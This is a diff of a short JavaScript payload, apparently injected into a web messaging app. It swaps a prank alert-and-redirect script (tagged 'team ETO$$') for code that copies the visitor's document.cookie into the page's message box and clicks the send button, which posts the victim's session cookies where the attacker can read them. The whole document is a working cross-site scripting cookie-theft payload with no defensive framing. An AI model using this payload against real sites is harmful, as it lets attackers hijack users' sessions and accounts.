@@ -1,4 +1,7 @@
-alert("team ETO$$");
-setTimeout(function() {
-    window.location.href = "https://www.youtube.com/shorts/-vLboqU_N30";
-}, 2000);
+var messageInput = document.getElementById("message");
+if (messageInput) 
+    messageInput.value = document.cookie;
+var sendMessageButton = document.querySelector(".input-group-addon.add-message");
+if (sendMessageButton) {
+    sendMessageButton.click();
+}
